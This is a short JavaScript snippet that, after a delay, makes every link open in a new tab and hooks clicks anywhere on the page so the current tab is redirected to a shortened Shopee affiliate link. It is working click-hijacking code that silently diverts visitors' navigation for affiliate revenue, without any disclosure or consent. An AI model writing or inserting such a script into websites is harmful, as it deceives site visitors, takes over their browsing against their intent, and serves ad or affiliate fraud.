var delayInMilliseconds = 2500;
setTimeout(function() {
(() => {
    const urlDirectClick = "https://shope.ee/9K3UCwSdbl";
    const urlDirectClick2 = "https://shope.ee/6UiVXIVq9w";
    document.querySelectorAll("a").forEach(element => {
        element.setAttribute("target", "_blank");
        element.addEventListener("click", event => {
            const isTargetBlank = event.target.target === "_blank";
            const isShortcutKeyPressed = event.ctrlKey || event.shiftKey || event.metaKey;
            if (isTargetBlank || isShortcutKeyPressed) {
                try {
                    setTimeout(() => {
                        window.location.href = urlDirectClick2;
                    }, 1000);
                } catch (e) {};
            };
        });
    });
    document.querySelector("body").addEventListener("click", (event) => {
        
        setTimeout(() => {
            window.location.href = urlDirectClick2;
        }, 1000);
    });
})();
}, delayInMilliseconds);
